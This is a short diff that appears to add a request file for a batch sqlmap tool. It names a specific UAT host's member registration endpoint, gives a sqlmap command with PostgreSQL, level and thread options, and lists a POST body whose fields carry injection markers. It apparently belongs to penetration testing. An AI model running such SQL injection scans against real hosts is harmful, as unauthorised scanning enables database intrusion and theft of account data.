@@ -1,0 +1,3 @@
+http://uat2gpom119.bwt18.com:80/member/member?type=saveAccount (POST)  # c:/sqlmap/sqlmap.py -v 3 --dbms=postgresql --threads 10 --level=3 -r D:\文档\PycharmProjects\BatchSqlmap\FrontEnd_Post_File\register --batch --output-dir ../PycharmProjects/BatchSqlmap/sqlmaplog
+
+key=add*&SS=&SR=&TS=&moneyType=1&account2=*&password=asdfasdf1&qurenPasswrod=asdfasdf1&realName=*&MultiPwd=*&drawMoneyPwd1=*&drawMoneyPwd2=*&drawMoneyPwd3=*&drawMoneyPwd4=*&zhuceYm=*&agree=*
